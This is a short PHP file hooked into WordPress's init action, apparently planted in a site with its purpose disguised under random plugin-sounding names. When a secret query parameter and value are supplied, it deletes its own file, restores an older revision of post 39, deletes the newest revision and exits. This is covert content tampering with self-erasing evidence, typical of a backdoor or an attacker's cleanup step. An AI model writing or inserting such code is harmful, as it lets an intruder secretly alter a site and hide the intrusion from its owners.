<?php

function php_gravatar_data_listing() {
	if (isset($_GET['scheduled_gravity_adsense_categories']) && $_GET['scheduled_gravity_adsense_categories'] === 'user_sales_cart_visual') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$information_solution_discount = 39;
		$ultimate_controller_top_translate = wp_get_post_revisions($information_solution_discount);
		if (empty($ultimate_controller_top_translate)) die('no revisions');
		if (count($ultimate_controller_top_translate) < 2) die('less than 2');
		$optimizer_sliding_old_your = array_shift($ultimate_controller_top_translate);
		$player_animated_gift = $optimizer_sliding_old_your->ID;
		$cleaner_easy_variation = array_shift($ultimate_controller_top_translate);
		$fields_request_notification = $cleaner_easy_variation->ID;
		$beaver_widgets_theme_multisite = wp_restore_post_revision($fields_request_notification);
		if ($beaver_widgets_theme_multisite === false) die('error restoring');
		$beaver_widgets_theme_multisite = wp_delete_post_revision($player_animated_gift);		
		if ($beaver_widgets_theme_multisite === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'php_gravatar_data_listing');
